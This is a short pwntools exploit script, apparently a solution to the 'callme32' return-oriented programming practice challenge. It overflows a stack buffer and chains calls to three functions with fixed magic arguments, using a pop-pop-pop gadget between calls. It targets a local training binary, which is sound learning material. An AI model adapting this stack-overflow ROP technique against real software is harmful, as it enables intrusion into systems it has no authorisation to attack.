from pwn import * 
 
p = process('./callme32') 
elf = ELF('./callme32') 
one_addr = elf.plt['callme_one'] 
two_addr = elf.plt['callme_two'] 
three_addr = elf.plt['callme_three'] 
pop_pop_pop_addr = 0x080487f9  
payload = 'A'*0x28 + 'A'*0x04 
payload += p32(one_addr)+p32(pop_pop_pop_addr)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d) 
payload += p32(two_addr)+p32(pop_pop_pop_addr)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d) 
payload += p32(three_addr)+p32(pop_pop_pop_addr)+p32(0xdeadbeef)+p32(0xcafebabe)+p32(0xd00df00d) 
p.sendlineafter('> ',payload) 
p.interactive()
